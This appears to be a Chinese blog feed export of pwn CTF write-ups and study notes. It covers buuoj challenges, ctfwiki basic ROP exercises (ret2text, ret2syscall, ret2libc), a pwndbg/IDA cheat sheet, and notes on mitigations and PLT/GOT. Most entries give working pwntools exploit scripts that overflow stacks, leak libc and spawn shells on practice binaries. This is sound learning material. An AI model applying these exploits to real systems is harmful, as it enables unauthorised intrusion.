src="https://i.loli.net/2021/06/14/S2GpzDv7LuorQtd.png" alt="image-20210614173216887"></p><p><img src="https://i.loli.net/2021/06/14/4hlwRWSD6oKQfts.png" alt="image-20210614173118814"></p><p>思路是AddLog函数的输入的值，在GetFlag的strcpy函数下可以溢出。</p><p><img src="https://i.loli.net/2021/06/14/cZpbxULluDnySw9.png" alt="image-20210614173257029"></p><p><img src="https://i.loli.net/2021/06/14/UvB4yMLEmsibZTG.png" alt="image-20210614173347120"></p><p>因为找不到<code>bin/sh</code>，然后通过师傅们的wp发现可以这么找。</p><p><img src="https://i.loli.net/2021/06/14/dWchJ79qpEye6Q8.png" alt="image-20210614173804217"></p><p>要注意，不正常退出会报错，所以记得找exit。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">27017</span>)</span><br><span class="line">system=<span class="number">0x80484D0</span></span><br><span class="line">binsh=<span class="number">0x80482ea</span></span><br><span class="line">exit=<span class="number">0x80484E0</span></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x48</span>+<span class="number">4</span>)+p32(system)+p32(exit)+p32(binsh)</span><br><span class="line">p.recvuntil(<span class="string">&quot;password:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;administrator&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;info:&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0.Exit\n:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="others-shellcode"><a href="#others-shellcode" class="headerlink" title="others_shellcode"></a>others_shellcode</h1><p>….这个题就离谱</p><h1 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h1><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/buuoj/%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9_2018_rop">铁人三项(第五赛区)_2018_rop</a></p><p><img src="https://i.loli.net/2021/06/15/lBDTcv3Rjtuh64E.png" alt="image-20210615184408096"></p><p>懒得写题解了，就是简单的libc泄露</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29307</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;2018_rop&quot;</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main=<span class="number">0x80484C6</span></span><br><span class="line">p.sendline(<span class="string">b&quot;A&quot;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">0</span>)+p32(write_got)+p32(<span class="number">4</span>))</span><br><span class="line">write=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;write&quot;</span>,write)</span><br><span class="line">libc_base=write-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;A&quot;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system)+p32(main)+p32(binsh))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h1><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/buuoj/bjdctf_2020_babyrop">bjdctf_2020_babyrop</a></p><p>上题是32位的，这个题是64位的。别的好像没啥大区别。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28535</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;bjdctf_2020_babyrop&quot;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">vuln=<span class="number">0x40067D</span></span><br><span class="line">pop_rdi=<span class="number">0x400733</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Pull up your sword and tell me u story!\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;A&quot;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln))</span><br><span class="line">puts=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts)</span><br><span class="line">libc_base=puts-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Pull up your sword and tell me u story!\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;A&quot;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(binsh)+p64(system))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="qctf-2018-stack2"><a href="#qctf-2018-stack2" class="headerlink" title="qctf_2018_stack2"></a>qctf_2018_stack2</h1><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/buuoj/QCTF_2018_stack2">qctf_2018_stack2</a></p><p>漏洞在这，没检查数组边界，通过后门函数拿shell就行。</p><p><img src="https://i.loli.net/2021/06/15/T8GzZW6UQkYchti.png" alt="image-20210615215548848"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; p32(0x0804859B)</span><br><span class="line">b<span class="string">&#x27;\x9b\x85\x04\x08&#x27;</span></span><br></pre></td></tr></table></figure><p>另外直接打是没办法打通的，因为返回地址的偏移不是0x70，还需要多偏移0x10的地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lea ecx, [esp+4]把返回地址+4存到ecx</span><br><span class="line">and esp, 0FFFFFFF0h 把esp低四位归0</span><br><span class="line">push [ecx-4]把返回地址压入栈</span><br></pre></td></tr></table></figure><p>具体返回位置通过调试可得知</p><p><img src="https://i.loli.net/2021/06/15/9nwlhyriR6e5CJQ.png" alt="image-20210615232639509"></p><p><img src="https://i.loli.net/2021/06/15/oLyxFMmiK1APwEt.png" alt="image-20210615225535917"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29883</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;have:\n&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;numbers\n&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;5. exit\n&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;change:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">116</span>+<span class="number">0x10</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;number:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0x9b</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;5. exit\n&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;change:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">117</span>+<span class="number">0x10</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;number:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0x85</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;5. exit\n&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;change:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">118</span>+<span class="number">0x10</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;number:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0x04</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;5. exit\n&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;change:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">119</span>+<span class="number">0x10</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;number:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0x08</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;5. exit\n&quot;</span>,<span class="string">&quot;5&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 2021年6月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[工具使用] pwn的工具使用</title>
      <link href="/2021/06/01/pwn%E7%9A%84%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/06/01/pwn%E7%9A%84%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"># 运行</span><br><span class="line">run [arg]         运行且传入参数，简写r</span><br><span class="line">set args [arg]    设置命令行参数</span><br><span class="line">[enter]           执行上一条指令</span><br><span class="line">return            执行函数到返回，简写ret</span><br><span class="line">finish            执行程序到返回，简写fini</span><br><span class="line">quit              退出，简写q</span><br><span class="line"></span><br><span class="line"># 调试</span><br><span class="line">next              单步步过高级语言，简写n</span><br><span class="line">nexti             单步步过汇编语言，简写ni</span><br><span class="line">step              单步步入高级语言，简写s</span><br><span class="line">stepi             单步步入汇编语言，简写si</span><br><span class="line"></span><br><span class="line"># 断点</span><br><span class="line">break             断点，简写b</span><br><span class="line">b *0x40000        在0x40000的地址上下断点</span><br><span class="line">info break        查看所有断点，简写info b</span><br><span class="line">del [break num]   删除断点</span><br><span class="line">c                 继续运行</span><br><span class="line"></span><br><span class="line"># 查看信息</span><br><span class="line">vmmap             显示当前进程空间内存分布</span><br><span class="line">stack n           显示栈上的值，n是显示内存的长度</span><br><span class="line">x /&lt;n/f/u&gt; &lt;addr&gt; nfu见上下，用于查看内存中的地址</span><br><span class="line"># 类型f</span><br><span class="line">t                 二进制</span><br><span class="line">o                 八进制</span><br><span class="line">d                 十进制</span><br><span class="line">u                 十六进制无符号</span><br><span class="line">a                 十六进制有符号</span><br><span class="line">c                 字符</span><br><span class="line">f                 浮点</span><br><span class="line"># 字节数</span><br><span class="line">b                 1字节</span><br><span class="line">h                 2字节</span><br><span class="line">w                 4字节</span><br><span class="line">g                 8字节</span><br><span class="line"></span><br><span class="line">print $rdx        打印rdx寄存器上的值</span><br><span class="line">print *$rdx       打印rdx寄存器上的地址存的值</span><br><span class="line">print /f &lt;addr&gt;   可以使用类型打印数据</span><br><span class="line">print symbol      打印符号</span><br></pre></td></tr></table></figure><h1 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctrl+s              查看段表</span><br><span class="line">ctrl+x              找到调用它的函数</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 2021年6月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[write up] ctfwiki学习</title>
      <link href="/2021/05/28/ctfwiki%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/05/28/ctfwiki%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-Basic-ROP"><a href="#0x00-Basic-ROP" class="headerlink" title="0x00 Basic ROP"></a>0x00 Basic ROP</h1><blockquote><p>wiki下载的ret2shellcode，bss段没有可执行权限</p><p>ret2libc3用LibcSearcher搜不到libc库</p></blockquote><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/ctfwiki/ret2text">ret2text</a></p><p><img src="https://i.loli.net/2021/05/28/XPAyBWEGrDzTJk8.png" alt="image-20210528110345985"></p><p><img src="https://i.loli.net/2021/05/28/Ds5vRmAi3tKuOa6.png" alt="image-20210528111444922"></p><p>gets函数存在栈溢出，在secure函数可以发现存在<code>system(&#39;/bin/sh&#39;)</code>。</p><p><img src="https://i.loli.net/2021/05/28/IMW5KpC2lLNyd31.png" alt="image-20210528111724529"></p><p>然后计算gets的buf与返回地址的偏移</p><p>可以看到s的地址是FFBDD5BC</p><p><img src="https://i.loli.net/2021/05/28/7K5QVj2CbgosNhd.png" alt="image-20210528113518323"></p><p>EBP的地址是FFBDD628</p><p><img src="https://i.loli.net/2021/05/28/fiwSX9yE7nUJcQs.png" alt="image-20210528113530604"></p><p><img src="https://i.loli.net/2021/05/28/iOoHXLvTKCUuFpS.png" alt="image-20210528113701049"></p><p>所以返回地址的偏移就是108+4=112。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>+p64(<span class="number">0x0804863A</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/ctfwiki/rop">ret2syscall</a></p><p><img src="https://i.loli.net/2021/05/28/yPvGp9ODw5WFUTN.png" alt="image-20210528125649383"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you plan to do?&quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个需要调用execve()函数，这个函数成功调用需要一定条件，<code>edx=0 ecx=0 [ebx]=&#39;/bin/sh&#39; eax=0xb int 0x80</code></p><p>然后使用ROPgadget寻找gadgets，达成条件即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">pop_eax=<span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">binsh=<span class="number">0x080be408</span></span><br><span class="line">int80=<span class="number">0x08049421</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>+p32(pop_eax)+p32(<span class="number">0xb</span>)+p32(pop_edx_ecx_ebx_ret)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(binsh)+p32(int80))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h2><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/ctfwiki/ret2libc1">ret2libc1</a></p><p><img src="https://i.loli.net/2021/05/28/6Ow3l57jcEeqPIX.png" alt="image-20210528150232141"></p><p>在ida找到system函数</p><p><img src="https://i.loli.net/2021/05/28/exn3rX87c6mi1NJ.png" alt="image-20210528150425252"></p><p><code>shift+F12</code>找到/bin/sh</p><p><img src="https://i.loli.net/2021/05/28/bSOEHJpD8YucMaz.png" alt="image-20210528150551335"></p><p>直接调用函数利用即可</p><p>要注意一点，32位系统调用函数的方式</p><p><img src="https://i.loli.net/2021/05/28/n3eyB4mjQa6qWsp.png" alt="image-20210528151028736"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line">binsh=<span class="number">0x08048720</span></span><br><span class="line">system=<span class="number">0x08048460</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;A&#x27;</span>*<span class="number">112</span>+p32(system)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(binsh))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h2><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/ctfwiki/ret2libc2">ret2libc2</a></p><p><img src="https://i.loli.net/2021/05/28/TyNHrg1kLDcUp9J.png" alt="image-20210528151242199"></p><p>这个程序和上面的区别就是没给<code>/bin/sh</code>字符串</p><p>首先要在bss段找到可以存放字符串的值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面<span class="comment"># gdb ret2libc2</span></span><br><span class="line">pwndbg&gt; start</span><br><span class="line">pwndbg&gt; vmmap</span><br></pre></td></tr></table></figure><p>可以看到第三行可读可写</p><p><img src="https://i.loli.net/2021/05/28/UjvuAgPqL8bwiCQ.png" alt="image-20210528151318129"></p><p>ida按g跳转到0x804a000，然后在0x804a000到0x804b000之间寻找bss段可用的地方，会看到有个数组。所以可以直接用这个存放数据。</p><p><img src="https://i.loli.net/2021/05/28/YNgdGHpStExIPQ1.png" alt="image-20210528152132703"></p><p>其他和上一个基本上一样，只是多了gets函数。只要理解了上面的就没啥问题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line">system=<span class="number">0x08048490</span></span><br><span class="line">gets=<span class="number">0x08048460</span></span><br><span class="line">bss=<span class="number">0x804a080</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span> + p32(gets) + p32(system) + p32(bss) + p32(bss)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 2021年5月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[学习笔记] pwn</title>
      <link href="/2021/05/27/pwn/"/>
      <url>/2021/05/27/pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-PWN工具"><a href="#0x00-PWN工具" class="headerlink" title="0x00 PWN工具"></a>0x00 PWN工具</h1><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><ul><li><code>send(payload)</code> 发送payload</li><li><code>sendline(payload)</code> 发送payload，并进行换行（末尾<strong>\n</strong>）</li><li><code>sendafter(some_string, payload)</code> 接收到 some_string 后, 发送你的 payload</li><li><code>recv(N)</code> 接受 N(数字) 字符</li><li><code>recvline()</code> 接收一行输出</li><li><code>recvlines(N)</code> 接收 N(数字) 行输出</li><li><code>recvuntil(some_string)</code> 接收到 some_string 为止</li><li><code>remote(&quot;一个域名或者ip地址&quot;, 端口)</code> 会连接到我们指定的地址及端口</li><li><code>process</code> 通过你声明的二进制文件路径在本地创建新的进程</li><li><code>p64()</code>会把64位整数转换为8字节字符串</li><li><code>u64()</code>会把8字节字符串转换为64位整数</li><li><code>interactive()</code>切换到直接交互模式</li></ul><h2 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h2><p><code>ROPgadget --binary rop --string &#39;/bin/sh&#39;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面<span class="comment"># ROPgadget --binary rop --only &#x27;int&#x27;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 1</span><br></pre></td></tr></table></figure><h1 id="0x01-PWN基础"><a href="#0x01-PWN基础" class="headerlink" title="0x01 PWN基础"></a>0x01 PWN基础</h1><h2 id="Linux下的漏洞缓解措施"><a href="#Linux下的漏洞缓解措施" class="headerlink" title="Linux下的漏洞缓解措施"></a>Linux下的漏洞缓解措施</h2><ol><li>NX</li></ol><blockquote><p>所有可以被修改写入shellcode的内存都不可执行</p></blockquote><ol start="2"><li>Stack Canary（可以通过读取绕过）</li></ol><blockquote><p>用于保护栈溢出。在函数执行前，在返回地址前写入一个字长的随机数据，函数返回时校验该值是否被改变，被改变就会直接终止程序。</p></blockquote><ol start="3"><li>ASLR</li></ol><blockquote><p>将程序堆栈地址和动态链接库的加载地址进行随机化，降低攻击者对程序内存结构的了解。即使攻击者布置了shellcode并可以控制跳转，仍然无法执行。</p></blockquote><ol start="4"><li>PIE</li></ol><blockquote><p>随机化elf</p></blockquote><ol start="5"><li>Full Relro</li></ol><blockquote><p>禁止.GOT和.PLT和其他相关内存读写</p></blockquote><h2 id="PLT和GOT"><a href="#PLT和GOT" class="headerlink" title="PLT和GOT"></a>PLT和GOT</h2><p><img src="https://i.loli.net/2021/05/27/Pcv87QVXZFdurUS.png" alt="image-20210527210645387"></p><p><code>08048460</code>是plt，<code>804A010</code>是got。执行gets函数使用plt地址，想知道gets函数真实地址，计算libc基址用got地址。</p><p>程序会先到plt寻找外部函数的地址，第一次调用时，程序会通过got表再次跳转到plt表，运行地址解析程序确定函数的确切地址，然后覆盖got表的初始值，然后进行函数调用。</p><p>第二次调用外部函数时，程序仍然首先从plt跳转到got，但是此时的got已经存有函数的内存地址，可以直接跳转函数所在地。</p><p>这么做的原因是为了效率，不用花时间去解析不用的函数。</p><h2 id="调用execve的条件"><a href="#调用execve的条件" class="headerlink" title="调用execve的条件"></a>调用execve的条件</h2><ul><li>32位：<code>edx=0 ecx=0 [ebx]=&#39;/bin/sh&#39; eax=0xb int 0x80</code></li><li>64位：<code>rdx=0 rsi=0 [rdi]=&#39;/bin/sh&#39; rax=0x3b syscall</code></li></ul><h2 id="bss段"><a href="#bss段" class="headerlink" title="bss段"></a>bss段</h2><p>寻找bss段地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -S ret2libc2 | grep bss</span><br></pre></td></tr></table></figure><p>检测bss段权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb -q ret2libc2</span><br><span class="line">start</span><br><span class="line">vmmap</span><br></pre></td></tr></table></figure><h2 id="32位函数"><a href="#32位函数" class="headerlink" title="32位函数"></a>32位函数</h2><p>32位函数正常调用时，会有一个对应的返回地址。这里以’bbbb’ 作为虚假的地址，其后参数对应的参数内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, p32(system_plt), <span class="string">&#x27;b&#x27;</span> * <span class="number">4</span>, p32(binsh_addr)</span><br></pre></td></tr></table></figure><h2 id="system堆栈平衡"><a href="#system堆栈平衡" class="headerlink" title="system堆栈平衡"></a>system堆栈平衡</h2><p>有些64位的glibc的payload调用system函数需要堆栈对齐16位。</p><h1 id="0x02-栈溢出"><a href="#0x02-栈溢出" class="headerlink" title="0x02 栈溢出"></a>0x02 